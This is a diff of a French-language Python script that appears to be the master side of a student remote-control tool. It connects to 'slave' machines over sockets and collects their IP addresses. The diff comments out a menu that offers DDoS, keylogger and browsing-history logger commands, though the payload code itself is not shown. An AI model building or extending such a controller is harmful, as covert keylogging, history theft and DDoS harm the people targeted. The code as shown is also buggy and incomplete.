@@ -18,37 +18,34 @@ connexion
 """
 class Communication():
 
-    def __init__(self, machineEsclave, s):
+    def __init__(self, machineEsclave, s, listeAdresseIP):
         self.machineEsclave = machineEsclave
         self.s = s
+        self.listeAdresseIP = listeAdresseIP
 
-    def connexion(self, machineEsclave, s):        
+    def connexion(self, s, listeAdresseIP):
+        
         try:
-            s.connect(machineEsclave)
-            print("Connecion établi avec l'esclave")
+            print(listeAdresseIP)
+            if len(listeAdresseIP) != 0:
+                for adresse in listeAdresseIP:
+                    machineEsclave = (adresse, 60000)
+                    s.connect(machineEsclave)
+                    print("Connecion établi avec l'esclave")
+            else:
+                print("On ne connait pas de machine esclave")
         except ConnectionRefusedError:
             print("Erreur de connexion")
-           
-    def master_listen():
-        #création du socket pour que le master écoute sur un port afin de récupérer les adresses IP
-        master_listen = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
-        #écoute sur toutes les adresses disponibles sur la machine et sur le port 60 000
-        master_listen.bind(("", 60000))
-        #une fois connecté, on le met en écoute afin qu'il reçoive l'IP du slave; l'IP sera contenue dans addr
-        master_listen. listen()
-        #afin de recevoir l'IP, on accepte de recevoir des données, puis on stocke l'IP récupérée dans une liste
-        distant_socket, addr = master_listen.accept()
-        liste_adresses_ip = []
-        liste_adresses_ip.append(addr[0])
-        return liste_adresses_ip
-    
-    def master_sendMessages(liste_adresses_ip):
-        # création du socket pour que le master envoie des messages au slave
-        master_sendMessages = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
-        # on définit les coordonnées sur lesquelles le master va envoyer ses instructions
-        for adresse in liste_adresses_ip:
-        slave_addr = (adresse, 60000)
-        master_sendMessages.connect(slave_addr)
+
+    def ecoute(self, s, listeAdresseIP):
+        s.bind(("", 60000))
+        s.listen()
+        print("j'attend que les slave se connecte")
+        distanSocket, addr = s.accept()
+        distanSocket.recv(1024).decode("utf-8")
+        listeAdresseIP.append(addr[0])
+        print(listeAdresseIP)
+        return listeAdresseIP
 
 """
 création de l'objet ChoixAction
@@ -96,7 +93,22 @@ class ChoixAction(Communication):
         s.send("transfert".encode("utf-8"))
         print(s.recv(1024).decode("utf-8"))
         
+    
+#on initie s et machineEsclave
+listeAdresseIP = []
+machineEsclave = ("localhost", 5000)
+s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
+#on assigne l'objet choixAction qui est l'enfant de l'objet Communication à la variable a
+a = ChoixAction(machineEsclave)
+#on lance la methode connexion de l'objet communication
+select1 = int(input("1)connecte \n2)ecoute \nSélectionnez une option : "))
+if select1 == 1:
+    a.connexion(s, listeAdresseIP)
+elif select1 == 2:
+    a.ecoute(s, listeAdresseIP)
 
+
+"""
 #petit choix multiple afin de savoir quelle methode on doit lancer
 select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
 while select != 5:
@@ -126,7 +138,7 @@ while select != 5:
     #si la connexion est arretée par le client pendant le choix multiple, il affichera le message ci dessous
     except ConnectionAbortedError:
         print("connexion arretée par le client")
-
+"""
 
 """
 Pour rendre le code plus cool ont pourrait rajouter des arguments grace
@@ -137,9 +149,6 @@ lesquels il sera connecter ect .......
 """
 
 s.close()
-
-
-
 
 
 
